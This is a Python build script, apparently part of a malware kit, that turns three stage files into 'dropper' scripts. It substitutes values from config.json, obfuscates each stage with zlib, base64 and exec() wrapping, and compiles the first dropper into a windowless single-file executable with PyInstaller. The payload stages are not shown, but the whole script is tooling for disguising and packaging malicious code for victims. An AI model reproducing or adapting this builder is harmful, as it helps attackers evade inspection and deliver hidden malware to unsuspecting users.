import json
import os
import sys
import zlib, base64


def obfuscate(text: str):
    compressed = zlib.compress(text.encode())
    encoded = base64.b64encode(compressed)
    code = f"import zlib,base64\nexec(zlib.decompress(base64.b64decode(\"{encoded.decode()}\".encode())).decode())"
    return code

print("Building with config: config.json")
config = {}
with open("config.json", "r") as f:
    config = json.load(f)

def obfuscate_files(files: dict):
    for f, output in files.items():
        content = ""
        with open(f, "r") as f:
            content = f.read()
        for key, value in config.items():
            content = content.replace(key, value)
        with open(output, "w") as f:
            f.write(obfuscate(content))


if "--help" in sys.argv:
    print("""
    options:
        --help: print the help message
        --debug: build the exe with console logging (console will be shown)
    examples:
        python generator.py
        python generator.py --debug""")
    quit()

debug = False

if len(sys.argv) > 1:
    if "--debug" in sys.argv:
        debug = True



for key, value in config.items():
    print(key)
    print(value)
temp = ''
while not temp in ["yes", "no"]:
    temp = input("Is this right [yes, no]? ")
    temp = temp.lower()
    if temp == "no":
        print("Modify config.json")
        print("quiting...")
        quit()

obfuscate_files({"stage1.py": "dropper.py", "stage2.py": "dropper2.py", "stage3.py": "dropper3.py"})

temp = ''
while not temp in ["yes", "no"]:
    temp = input("Build to exe [yes, no] ? ").lower()
    if temp == "no":
        print("Ok, exiting...")
        quit()

exe_name = ""
if temp == "yes":
    requirements = ""
    with open("module_requirements.txt", "r") as f:
        requirements = f.read()
    exe_name = input("Exe file name (no spaces): ")
    cmd = "python -m PyInstaller dropper.py --onefile --name " + exe_name
    if not debug:
        cmd += " --noconsole"
    for req in requirements.split("\n"):
        cmd += " --hidden-import " + req
    print("$ " + cmd)
    os.system(cmd)

if not debug: quit()
temp = ''
while not temp in ["yes", "no"]:
    temp = input("run exe file [yes, no]? ").lower()
    if temp == "no":
        print("Exiting...")
        quit()
if temp == "yes":
    os.chdir("dist")
    os.system(exe_name if ".exe" in exe_name else exe_name + ".exe")